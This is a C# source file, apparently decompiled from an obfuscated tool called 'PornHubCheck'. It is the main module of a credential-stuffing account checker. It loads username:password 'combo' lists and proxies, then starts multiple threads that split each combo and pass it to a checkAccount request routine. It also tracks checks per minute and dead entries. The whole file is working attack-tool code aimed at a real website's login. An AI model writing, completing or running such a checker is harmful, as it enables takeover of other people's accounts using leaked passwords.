using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace PornHubCheck
{
    class Module
    {
        [STAThread]
        public static void __VMFUNCTION__5586()
        {
            if (!Load.loadCombos())
            {
                Module.__VMFUNCTION__5586();
            }
            Load.proxySelect();
            if (!Load.loadProxies())
            {

                Module.__VMFUNCTION__5586();
            }
            Load.getThreads();
            Colorful.Console.Clear();
            Initialization.mainMenu();
            System.Timers.Timer timer = new System.Timers.Timer(100)
            {
                AutoReset = true
            };
            timer.Elapsed += Module.__VMFUNCTION__2C90;
            timer.Start();
            uint num4 = (uint)0;
            for (int i = 0; i < Program.threads; i++)
            {
                new Thread(new ThreadStart(Module.__VMFUNCTION__5585)).Start();
            }
            uint num7 = (uint)1;
            while (num7 != (uint)0)
            {
                uint num8;
                if ((uint)Program.COMBOS.Count == (uint)0)
                {
                    uint num6 = (uint)Program.checkedCnt;
                    num8 = (((uint)Program.comboCount == num6) ? 1u : 0u);
                }
                else
                {
                    num8 = (uint)0;
                }
                if (num8 != (uint)0)
                {
                    Thread.Sleep(5000);
                    Colorful.Console.WriteAscii("Complete", Color.Coral);
                    num7 = (uint)0;
                }
            }
        }

        // Token: 0x06000004 RID: 4 RVA: 0x000022BC File Offset: 0x000004BC
        public static void __VMFUNCTION__2C90(object A_0, ElapsedEventArgs A_1)
        {
            Program.cpm2 = Program.cpm;
            Program.cpm = 0;
        }

        // Token: 0x06000005 RID: 5 RVA: 0x000022E0 File Offset: 0x000004E0
        public static void __VMFUNCTION__5585()
        {
            for (; ; )
            {
                Utilities.WriteTitle();
                if ((((uint)Program.COMBOS.Count == (uint)0) ? 1u : 0u) != (uint)0)
                {
                    break;
                }
                string text;
                if ((Program.COMBOS.TryTake(out text) ? 1u : 0u) == (uint)0)
                {
                    break;
                }
                if ((text.Contains(":") ? 1u : 0u) != (uint)0)
                {
                    char[] separator = new char[]
                    {
                    (char)((short)58)
                    };
                    string username = (string)text.Split(separator)[0];
                    string password = (string)text.Split(separator)[1];
                    Requests.checkAccount(username, password);
                }
                else
                {
                    Interlocked.Increment(ref Program.deadCnt);
                }
                Interlocked.Increment(ref Program.cpm);
                object obj10 = Interlocked.Increment(ref Program.checkedCnt);
                Utilities.WriteTitle();
            }
        }
    }
}
